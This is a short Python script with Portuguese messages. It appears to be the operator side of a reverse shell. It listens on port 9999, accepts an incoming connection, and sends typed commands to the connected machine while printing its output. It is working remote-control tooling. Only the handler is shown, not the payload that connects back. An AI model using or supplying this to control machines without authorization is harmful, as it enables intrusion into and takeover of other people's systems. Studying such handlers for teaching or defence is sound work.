import socket, sys

def cria_socket():
    try:
        global host
        global port
        global sock
        host=''
        port=9999
        sock=socket.socket()
    except socket.error as msg:
        print ('Erro ao criar o socket: ' + str(msg))

def bind_socket():
    try:
        sock.bind((host, port))
        sock.listen(10)
        print('Escutando na porta: ' + str(port))
    except socket.error as msg:
        print('Erro ao colocar o socket para escutar: ' + str(msg) + '\n' + 'Tentando novamente...')
        bind_socket()

def aceita_socket():
    bind, addr = sock.accept()
    print ('Conexão estabelecida: \n' + 'IP: ' + str(addr[0]) + '\n' + 'Port: ' + str(addr[1]))
    envia_comandos(bind)

def envia_comandos(bind):
    while True:
        cmd = input()
        if cmd == 'quit':
            bind.close()
            sock.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            bind.send(str.encode(cmd))
            resposta = str(bind.recv(1024), "utf-8")
            print (resposta,end='')

cria_socket()
bind_socket()
aceita_socket()
